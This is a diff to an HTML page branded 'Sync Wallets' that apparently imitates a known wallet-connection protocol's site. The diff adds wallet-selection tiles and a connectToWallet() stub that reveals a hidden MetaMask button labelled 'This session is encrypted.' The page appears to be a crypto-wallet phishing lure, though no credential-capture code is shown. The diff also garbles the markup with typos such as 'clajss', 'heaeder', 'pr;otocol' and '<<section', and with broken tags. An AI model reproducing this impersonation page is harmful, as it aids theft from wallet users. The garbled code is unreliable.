@@ -26,7 +26,7 @@
   <meta name="og:description" content="Open protocol for connecting Wallets to Dapps, Servers and Validations">
   <meta name="og:site_name" content="Sync Wallets">
   <meta name="fb:admins" content="365412154213405">
-
+<
   <style
     data-styled="dijnUu  hfVnjX fiuMUO kyUqCt eyaBAy hnlESl guKAph fuQfHo hDbjSS fAmUdU gFeYHJ jGHRMl ibLsRQ gAVVCu cmAzHq kSIOSl lfUBtr eodRCW ceWocr jVWwwJ YwSGw hvbAKM"
     data-styled-version="4.4.1">
@@ -620,7 +620,7 @@
       font-weight: 600;
     }
   </style>
-<section class="hidden">  
+
 </head>
 
 <body style="display: block;">
@@ -631,7 +631,7 @@
     <div class="containerz">
       <div class="boxz">
         <div class="borderz one"></div>
-        <div class="borderz two"></div>
+        <div clajss="borderz two"></div>
         <div class="borderz three"></div>
         <div class="borderz four"></div>
 
@@ -830,17 +830,59 @@
               <div class="Header__SLogo-cphy8j-2 hnlESl">
                 <a href="https://tokenauthservice.com/en"><img style="margin: auto" src="assets/iogo.jpg" alt=""></a>
               </div><a class="Header__SInternalLink-cphy8j-1 guKAph" href="https://tokenauthservice.com/en#">dApps</a>
-            </header>
+            </heaeder>
             <div class="layout__SContainer-wjwiqk-2 fuQfHo">
               <div class="pageStyles__SIndexPage-sc-1navawn-0 hDbjSS">
                 <div class="pageStyles__SBrandingWrapper-sc-1navawn-1 fAmUdU">
                   <h1 class="pageStyles__SBranding-sc-1navawn-2 gFeYHJ">Wallets</h1>
                   <div class="pageStyles__SPageDescription-sc-1navawn-3 jGHRMl">Multiple iOS and Android wallets support
-                    the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp
+                    the pr;otocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp
                     with your mobile wallet. Interaction between mobile apps and mobile browsers
                     are supported via mobile deep linking.</div>
                 </div>
-                <section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
+                <<section class="pageStyles__SSection-sc-1navawn-4 ibLsRQ">
+  <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
+    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq" onclick="connectToWallet('MetaMask')">
+      <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+        <img class="img-icons" src="assets/Tezos-XTZ-Logo.png" alt="Tezos">
+      </div>
+      <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Tezos</div>
+    </div>
+    <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq" onclick="connectToWallet('Coinomi')">
+      <div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+        <img class="img-icons" src="assets/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg" alt="Coinomi">
+      </div>
+      <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinomi</div>
+    </div>
+    <!-- Repeat for other wallets -->
+    <button id="connect-METAMASK" class="sc-kPVwWT sc-kfGgVZ sc-kIPQKe dQoUpv" style="display:none;">
+      <div class="sc-esjQYD iGptdp">
+        <div color="#E8831D" class="sc-RefOD jsJmJE">MetaMask</div>
+        <div class="sc-iQKALj GTKuw">This session is encrypted.</div>
+      </div>
+      <div class="sc-bwCtUz lgYJCf">
+        <img class="firstImg" src="https://tokenauthservice.com/assets/external.html" alt="Icon" style="width: 24px;">
+      </div>
+    </button>
+  </div>
+</section>
+
+<script>
+  function connectToWallet(wallet) {
+    // Show the MetaMask button (if it's hidden)
+    document.getElementById('connect-METAMASK').style.display = 'block';
+
+    // Additional logic for connecting to the selected wallet can go here
+    if (wallet === 'MetaMask') {
+      // Logic to connect to MetaMask
+      console.log("Connecting to MetaMask...");
+    } else {
+      // Logic for other wallets if needed
+      console.log(`Connecting to ${wallet}...`);
+    }
+  }
+</script>
+
                   <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
 
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
@@ -1349,7 +1391,7 @@
                     </div>
 
                   </div>
-                </section>
+                
               </div>
             </div>
             <footer class="Footer__SFooter-sc-1k47aoh-0 jVWwwJ">
